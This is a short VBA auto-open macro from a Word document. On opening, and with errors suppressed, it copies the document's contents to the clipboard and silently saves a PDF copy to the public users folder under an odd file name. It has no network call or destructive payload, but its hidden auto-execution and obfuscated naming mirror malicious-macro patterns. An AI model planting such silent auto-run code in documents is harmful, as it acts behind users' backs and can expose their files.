Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim lckhv437 As Object
    On Error Resume Next
    Set lckhv437 = ActiveDocument.Range
    lckhv437.Copy
    ActiveDocument.ExportAsFixedFormat OutputFileName:= _
        "C:\Users\Public\oblivionx_format.pdf", ExportFormat:=wdExportFormatPDF
End Sub
